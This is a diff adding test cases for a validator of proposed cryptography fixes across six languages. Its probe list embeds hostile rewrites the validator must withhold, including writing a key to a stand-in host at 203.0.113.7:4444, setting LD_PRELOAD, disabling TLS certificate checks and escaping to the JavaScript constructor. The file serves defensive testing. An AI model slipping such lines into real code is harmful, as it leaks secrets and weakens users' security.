@@ -574,3 +574,205 @@ def test_review_good_fixes_in_every_language_still_pass(name, lang, codes, windo
     out = FIX.validate(_fix_answer(code), _grounding(finding), _window(finding))
     assert out["status"] == "ok", (name, out.get("withheld_reason"), out.get("checks"))
     assert any(c["name"] == "only allow-listed APIs" and c["ok"] for c in out["checks"])
+
+
+# ------------------------------------------------------------------------------------------------ round 3 of PR 249
+# rev249 probe_fix5.py (every row) plus the variations tried while fixing them. Receivers are checked: Type.member /
+# pkg.Func pairs are listed, a local's members only when it was made by a listed call, interpolations are code.
+_SOCKW = ("import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n"
+          "    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)\n")
+_TLSW = ("import ssl\nfrom Crypto.Cipher import AES\n\ndef ctx():\n    c = ssl.create_default_context()\n"
+         "    c.check_hostname = False\n    return c\n")
+_JS5 = ("const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n"
+        "  return c.update(d);\n}")
+_T5 = "\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}"
+_H5 = "const crypto = require('crypto');\nfunction enc(d, k) {\n"
+_KT = ("import javax.crypto.Cipher\n\nfun enc(k: ByteArray): ByteArray? {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n"
+       "    return null\n}")
+_GO5 = 'import (\n\t"crypto/aes"\n\t"os"\n)\n\nfunc enc(k []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n}'
+_GOT = 'import (\n\t"crypto/tls"\n)\n\nfunc cfg() *tls.Config {\n\tc := &tls.Config{MinVersion: tls.VersionTLS10}\n\treturn c\n}'
+_JV5 = ("import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k) throws Exception {\n"
+        "    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}")
+_CS5 = ("using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k) {\n    var a = Aes.Create();\n"
+        "    a.Mode = CipherMode.ECB;\n    return null;\n  }\n}")
+_JT5 = ("const crypto = require('crypto');\nconst tls = require('tls');\nfunction enc(d, k) {\n"
+        "  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}")
+_JT5_LINE = "  const c = crypto.createCipheriv('aes-128-ecb', k, null);"
+_JT5_GCM = "\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));"
+_GOW = 'package a\n\nimport (\n\t"crypto/des"\n\t"io"\n)\n\nfunc c(w io.Writer, k []byte) { b, _ := des.NewCipher(k); _ = b }\n'
+_GOW_HEAD = 'package a\n\nimport (\n\t"crypto/aes"\n\t"io"\n)\n\nfunc c(w io.Writer, k []byte) { b, _ := aes.NewCipher(k); '
+_JVA = ("import javax.crypto.Cipher;\nclass A {\n  Cipher c() throws Exception { return Cipher.getInstance("
+        "\"AES/ECB/PKCS5Padding\"); }\n}\n")
+_CSA = "using System.Security.Cryptography;\nclass A {\n  byte[] E(byte[] k) { var a = DES.Create(); return null; }\n}\n"
+_JSA = _H5 + "  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n"
+PROBES_5 = [  # (name, language, window, line, rewrite, expected, codes)
+    ("os.environ store (proxy)", "python", ECB, 5, _body("    os.environ['HTTPS_PROXY'] = '203.0.113.7:3128'" + _R), "withheld"),
+    ("os.environ store (LD_PRELOAD)", "python", ECB, 5, _body("    os.environ['LD_PRELOAD'] = 'x.so'" + _R), "withheld"),
+    ("os.environ update", "python", ECB, 5, _body("    os.environ.update(X='1')" + _R), "withheld"),
+    ("del os.environ", "python", ECB, 5, _body("    del os.environ['X']" + _R), "withheld"),
+    ("os.putenv", "python", ECB, 5, _body("    os.putenv('X', '1')" + _R), "withheld"),
+    ("from os import environ store", "python", ECB, 5, "import os\nfrom os import environ\nfrom Crypto.Cipher import AES\n\n"
+     "def encrypt(data, key):\n    environ['X'] = '1'" + _R + "\n", "withheld"),
+    ("os.environ read is fine", "python", ECB, 5, _body("    k = os.environ.get('K') or os.environ['K2']" + _R), "ok"),
+    ("indirect call via key=print", "python", ECB, 5, _body("    max([key], key=print)" + _R), "withheld"),
+    ("decorator @print", "python", ECB, 5, _body("    @print\n    def f(): pass" + _R), "withheld"),
+    ("walrus os.environ", "python", ECB, 5, _body("    (e := os.environ)" + _R), "withheld"),
+    ("reuse sock.sendall(key)", "python", _SOCKW, 5, _SOCKW.replace(
+        "AES.MODE_ECB).encrypt(data)", "AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n    sock.sendall(key)"), "withheld"),
+    ("existing sock new connect()", "python", _SOCKW, 5, _SOCKW.replace(
+        "AES.MODE_ECB).encrypt(data)", "AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n"
+        "    sock.connect(('203.0.113.7', 4444))"), "withheld"),
+    ("keep existing sock.sendall(ct)", "python", _SOCKW, 5, _SOCKW.replace(
+        "AES.MODE_ECB).encrypt(data)", "AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)"), "ok"),
+    ("load_verify_locations literal path", "python", _TLSW, 6, _TLSW.replace(
+        "    c.check_hostname = False\n", "    c.load_verify_locations('/etc/hosts')\n"), "withheld"),
+    ("load_verify_locations from env", "python", _TLSW, 6, "import os\n" + _TLSW.replace(
+        "    c.check_hostname = False\n", "    c.load_verify_locations(cafile=os.environ['CA_BUNDLE'])\n"), "ok"),
+    ("check_hostname=False added", "python", ECB, 5, "import os\nimport ssl\nfrom Crypto.Cipher import AES\n\n"
+     "def encrypt(data, key):\n    c = ssl.create_default_context(); c.check_hostname = False" + _R + "\n", "withheld"),
+    ("GOOD js gcm", "javascript", _JS5, 3, _H5 + "  const iv = crypto.randomBytes(12);" + _T5, "ok"),
+    ("GOOD js env key", "javascript", _JS5, 3, _H5 + "  const iv = crypto.randomBytes(12);"
+     + _T5.replace("k,", "Buffer.from(process.env.APP_KEY, 'base64'),"), "ok"),
+    ("escaped computed key", "javascript", _JS5, 3, _H5 + "  enc['\\x63onstructor']('return 1')();" + _T5, "withheld"),
+    ("unicode-escaped computed key", "javascript", _JS5, 3, _H5 + "  enc['\\u0063onstructor']('return 1')();" + _T5,
+     "withheld"),
+    ("?.['constructor']", "javascript", _JS5, 3, _H5 + "  enc?.['constructor'];" + _T5, "withheld"),
+    ("API call inside ${}", "javascript", _JS5, 3, _H5 + "  const t = `${k.anyUnlistedMember()}`;" + _T5, "withheld"),
+    ("tagged template Function", "javascript", _JS5, 3, _H5 + "  Function`x`;" + _T5, "withheld"),
+    ("NODE_TLS_REJECT_UNAUTHORIZED", "javascript", _JS5, 3, _H5 + "  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';"
+     + _T5, "withheld"),
+    ("rejectUnauthorized false", "javascript", _JS5, 3, _H5 + "  const o = { rejectUnauthorized: false };" + _T5,
+     "withheld"),
+    ("tls.connect inside ${}", "javascript", _JT5, 4, _JT5.replace(
+        _JT5_LINE, "  `${tls.connect(4444, '203.0.113.7').write(k)}`;" + _JT5_GCM), "withheld"),
+    ("tls.connect bare", "javascript", _JT5, 4, _JT5.replace(
+        _JT5_LINE, "  tls.connect(4444, '203.0.113.7').write(k);" + _JT5_GCM), "withheld"),
+    ("js alias of tls", "javascript", _JS5, 3, "const crypto = require('crypto');\nconst t = require('tls');\n"
+     "function enc(d, k) {\n  t.connect(443, 'h');" + _T5, "withheld"),
+    ("js destructured connect", "javascript", _JS5, 3, "const crypto = require('crypto');\n"
+     "const { connect } = require('tls');\nfunction enc(d, k) {\n  connect(443, 'h');" + _T5, "withheld"),
+    ("js [].constructor", "javascript", _JS5, 3, _H5 + "  [].constructor;" + _T5, "withheld"),
+    ("js toString.call", "javascript", _JS5, 3, _H5 + "  k.toString.call(d);" + _T5, "withheld"),
+    ("js tls['connect']", "javascript", _JS5, 3, _H5 + "  const x = tls['connect'];" + _T5, "withheld"),
+    ("js template of a length", "javascript", _JS5, 3, _H5 + "  const s = `${d.length}`;" + _T5, "ok"),
+    ("kotlin file read in template", "kotlin", _KT, 4, _KT.replace(
+        "    return null", "    val s = \"${java.io.File(\"p\").readText()}\"\n    return null"), "withheld"),
+    ("kotlin file read", "kotlin", _KT, 4, _KT.replace("    return null", "    java.io.File(\"p\").readText()\n    return null"),
+     "withheld"),
+    ("kotlin unlisted member in template", "kotlin", _KT, 4, _KT.replace(
+        "    return null", "    val s = \"${c.anyUnlistedMember()}\"\n    return null"), "withheld"),
+    ("kotlin trailing-lambda call", "kotlin", _KT, 4, _KT.replace("    return null", "    thread(start = true) { }\n"
+                                                                    "    return null"), "withheld"),
+    ("go os.Open", "go", _GO5, 7, _GO5.replace("\t_ = b\n", "\t_ = b\n\tf, _ := os.Open(\"p\")\n\t_ = f\n"), "withheld"),
+    ("go InsecureSkipVerify", "go", _GOT, 6, _GOT.replace("MinVersion: tls.VersionTLS10",
+                                                          "MinVersion: tls.VersionTLS12, InsecureSkipVerify: true"),
+     "withheld"),
+    ("go TLS 1.2 minimum", "go", _GOT, 6, _GOT.replace("tls.VersionTLS10", "tls.VersionTLS12"), "ok"),
+    ("go Write on a parameter", "go", _GOW, 8, _GOW_HEAD + "_ = b; w.Write(k) }\n", "withheld"),
+    ("go Write via an alias", "go", _GOW, 8, _GOW_HEAD + "x := w; x.Write(k); _ = b }\n", "withheld"),
+    ("GOOD java gcm", "java", _JV5, 5, _JV5.replace("ECB/PKCS5Padding", "GCM/NoPadding"), "ok"),
+    ("java Class.forName", "java", _JV5, 5, _JV5.replace("    return null;", "    Class.forName(\"X\");\n    return null;"),
+     "withheld"),
+    ("java this.field call", "java", _JVA, 3, _JVA.replace("{ return Cipher", "{ this.out.write(1); return Cipher")
+     .replace("ECB/PKCS5Padding", "GCM/NoPadding"), "withheld"),
+    ("java trust-all manager", "java", _JVA, 3, _JVA.replace(
+        "{ return Cipher", "{ Object t = new X509TrustManager() { }; return Cipher").replace("ECB/PKCS5Padding",
+                                                                                           "GCM/NoPadding"), "withheld"),
+    ("java TLSv1 minimum", "java", _JVA, 3, _JVA.replace(
+        "{ return Cipher", "{ javax.net.ssl.SSLContext.getInstance(\"TLSv1\"); return Cipher"), "withheld"),
+    ("csharp File.Create", "csharp", _CS5, 6, _CS5.replace("    return null;", "    File.Create(\"p\");\n    return null;"),
+     "withheld"),
+    ("csharp Activator", "csharp", _CS5, 6, _CS5.replace("    return null;", "    Activator.CreateInstance(t);\n"
+                                                                              "    return null;"), "withheld"),
+    ("csharp File.ReadAllBytes key", "csharp", _CSA, 3, _CSA.replace(
+        "var a = DES.Create();", "var a = Aes.Create(); a.Key = File.ReadAllBytes(\"k\");"), "withheld"),
+    ("csharp interpolated file read", "csharp", _CSA, 3, _CSA.replace(
+        "var a = DES.Create();", "var a = Aes.Create(); var s = $\"{System.IO.File.ReadAllText(\"k\")}\";"), "withheld"),
+    ("csharp Encoding.UTF8.GetBytes", "csharp", _CSA, 3, "using System.Text;\n" + _CSA.replace(
+        "var a = DES.Create();", "var a = Aes.Create(); var b = Encoding.UTF8.GetBytes(\"x\");"), "ok"),
+    ("ts MD5 added", "typescript", _JS5, 3, _JSA + "  crypto.createHash('MD5');\n  return c.update(d);\n}", "withheld"),
+]
+
+
+@pytest.mark.parametrize("name, lang, window, line, code, expected", PROBES_5, ids=[p[0] for p in PROBES_5])
+def test_round3_every_probe_has_its_outcome(name, lang, window, line, code, expected):
+    test_review_every_probe_has_its_outcome(name, lang, window, line, code, expected)
+
+
+_MD5PY = "import hashlib\n\ndef mac(key, msg):\n    return hashlib.md5(key + msg).hexdigest()\n"
+_JSPW = "const crypto = require('crypto');\nfunction hash(pw) {\n  return crypto.createHash('md5').update(pw).digest('hex');\n}\n"
+_JVH = ("import java.security.MessageDigest;\nclass H {\n  byte[] h(byte[] d) throws Exception { return "
+        "MessageDigest.getInstance(\"MD5\").digest(d); }\n}\n")
+_JVC = ("import javax.crypto.Cipher;\nclass A {\n  byte[] e(java.security.Key key, byte[] iv, byte[] p) throws Exception {\n"
+        "    Cipher c = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n    return null;\n  }\n}\n")
+_KTC = ("import javax.crypto.Cipher\n\nfun enc(k: java.security.Key, p: ByteArray): ByteArray? {\n"
+        "    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    return null\n}")
+_GOM = "package a\n\nimport (\n\t\"crypto/md5\"\n)\n\nfunc mac(k, d []byte) [16]byte { return md5.Sum(append(k, d...)) }\n"
+_GOC = ("package a\n\nimport (\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n)\n\nfunc enc(k, pt []byte) []byte { b, _ := "
+        "aes.NewCipher(k); out := make([]byte, len(pt)); b.Encrypt(out, pt); return out }\n")
+_GOR = ("package a\n\nimport (\n\t\"crypto/rand\"\n\t\"crypto/rsa\"\n)\n\nfunc key() (*rsa.PrivateKey, error) "
+        "{ return rsa.GenerateKey(rand.Reader, 1024) }\n")
+_CSH = "using System.Security.Cryptography;\nclass H {\n  byte[] h(byte[] d) { return MD5.Create().ComputeHash(d); }\n}\n"
+GOOD_FIXES_3 = [
+    ("py hmac-sha256", "python", ["WEAK_ALGORITHM"], _MD5PY, 4,
+     "import hashlib\nimport hmac\n\ndef mac(key, msg):\n    return hmac.new(key, msg, hashlib.sha256).hexdigest()\n"),
+    ("py argon2", "python", ["WEAK_ALGORITHM"], _MD5PY, 4,
+     "import hashlib\nimport argon2\n\ndef mac(key, msg):\n    return argon2.PasswordHasher().hash(key + msg)\n"),
+    ("py fernet", "python", ["WEAK_CIPHER_MODE"],
+     "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    return AES.new(key, AES.MODE_ECB).encrypt(data)\n", 5,
+     "import os\nfrom cryptography.fernet import Fernet\n\ndef encrypt(data, key):\n"
+     "    return Fernet(os.environ['APP_FERNET_KEY'].encode()).encrypt(data)\n"),
+    ("py secrets token", "python", ["WEAK_RNG"], "import random\n\ndef token():\n    return '%x' % random.getrandbits(128)\n", 4,
+     "import random\nimport secrets\n\ndef token():\n    return secrets.token_hex(16)\n"),
+    ("js scrypt", "javascript", ["WEAK_ALGORITHM"], _JSPW, 3,
+     "const crypto = require('crypto');\nfunction hash(pw) {\n  const salt = crypto.randomBytes(16);\n"
+     "  return salt.toString('hex') + ':' + crypto.scryptSync(pw, salt, 64).toString('hex');\n}\n"),
+    ("js timingSafeEqual", "javascript", ["WEAK_ALGORITHM"], _JSPW, 3,
+     "const crypto = require('crypto');\nfunction hash(pw, expected) {\n"
+     "  const h = crypto.createHash('sha256').update(pw).digest();\n  return crypto.timingSafeEqual(h, expected);\n}\n"),
+    ("js webcrypto", "javascript", ["WEAK_CIPHER_MODE"],
+     "const crypto = require('crypto');\nasync function enc(key, data) {\n  const c = crypto.createCipheriv('aes-128-ecb', "
+     "key, null);\n  return c.update(data);\n}\n", 3,
+     "const crypto = require('crypto');\nasync function enc(key, data) {\n  const iv = crypto.randomBytes(12);\n"
+     "  return crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, data);\n}\n"),
+    ("ts typed pbkdf2", "typescript", ["WEAK_ALGORITHM"], _JSPW, 3,
+     "const crypto = require('crypto');\nfunction hash(pw: string): string {\n  const salt: Buffer = crypto.randomBytes(16);\n"
+     "  return crypto.pbkdf2Sync(pw, salt, 600000, 32, 'sha256').toString('hex');\n}\n"),
+    ("java sha-256", "java", ["WEAK_ALGORITHM"], _JVH, 3,
+     "import java.security.MessageDigest;\nclass H {\n  byte[] h(byte[] d) throws Exception { MessageDigest md = "
+     "MessageDigest.getInstance(\"SHA-256\"); return md.digest(d); }\n}\n"),
+    ("java pbkdf2", "java", ["WEAK_ALGORITHM"], _JVH, 3,
+     "import java.security.MessageDigest;\nimport javax.crypto.SecretKeyFactory;\nimport javax.crypto.spec.PBEKeySpec;\n"
+     "class H {\n  byte[] h(char[] pw, byte[] salt) throws Exception { SecretKeyFactory f = SecretKeyFactory.getInstance("
+     "\"PBKDF2WithHmacSHA256\"); return f.generateSecret(new PBEKeySpec(pw, salt, 600000, 256)).getEncoded(); }\n}\n"),
+    ("java gcm init", "java", ["WEAK_CIPHER_MODE"], _JVC, 4,
+     "import javax.crypto.Cipher;\nimport javax.crypto.spec.GCMParameterSpec;\nclass A {\n  byte[] e(java.security.Key key, "
+     "byte[] iv, byte[] p) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n"
+     "    c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));\n    return c.doFinal(p);\n  }\n}\n"),
+    ("kotlin gcm", "kotlin", ["WEAK_CIPHER_MODE"], _KTC, 4,
+     "import javax.crypto.Cipher\nimport javax.crypto.spec.GCMParameterSpec\nimport java.security.SecureRandom\n\n"
+     "fun enc(k: java.security.Key, p: ByteArray): ByteArray? {\n    val iv = ByteArray(12)\n"
+     "    SecureRandom().nextBytes(iv)\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n"
+     "    c.init(Cipher.ENCRYPT_MODE, k, GCMParameterSpec(128, iv))\n    return iv + c.doFinal(p)\n}"),
+    ("go hmac", "go", ["WEAK_ALGORITHM"], _GOM, 7,
+     "package a\n\nimport (\n\t\"crypto/hmac\"\n\t\"crypto/sha256\"\n)\n\nfunc mac(k, d []byte) []byte "
+     "{ m := hmac.New(sha256.New, k); m.Write(d); return m.Sum(nil) }\n"),
+    ("go gcm seal", "go", ["WEAK_CIPHER_MODE"], _GOC, 8,
+     "package a\n\nimport (\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n)\n\nfunc enc(k, pt []byte) []byte "
+     "{ b, _ := aes.NewCipher(k); g, _ := cipher.NewGCM(b); n := make([]byte, g.NonceSize()); rand.Read(n); "
+     "return g.Seal(n, n, pt, nil) }\n"),
+    ("go rsa 3072", "go", ["WEAK_KEY_SIZE"], _GOR, 8, _GOR.replace("1024", "3072")),
+    ("csharp sha256", "csharp", ["WEAK_ALGORITHM"], _CSH, 3,
+     "using System.Security.Cryptography;\nclass H {\n  byte[] h(byte[] d) { return SHA256.HashData(d); }\n}\n"),
+    ("csharp pbkdf2", "csharp", ["WEAK_ALGORITHM"], _CSH, 3,
+     "using System.Security.Cryptography;\nclass H {\n  byte[] h(byte[] d) { var salt = RandomNumberGenerator.GetBytes(16); "
+     "return Rfc2898DeriveBytes.Pbkdf2(d, salt, 600000, HashAlgorithmName.SHA256, 32); }\n}\n"),
+    ("csharp hmac", "csharp", ["WEAK_ALGORITHM"], _CSH, 3,
+     "using System.Security.Cryptography;\nclass H {\n  byte[] h(byte[] k, byte[] d) { using var m = new HMACSHA256(k); "
+     "return m.ComputeHash(d); }\n}\n"),
+]
+
+
+@pytest.mark.parametrize("name, lang, codes, window, line, code", GOOD_FIXES_3, ids=[g[0] for g in GOOD_FIXES_3])
+def test_round3_more_good_fixes_in_every_language_still_pass(name, lang, codes, window, line, code):
+    test_review_good_fixes_in_every_language_still_pass(name, lang, codes, window, line, code)
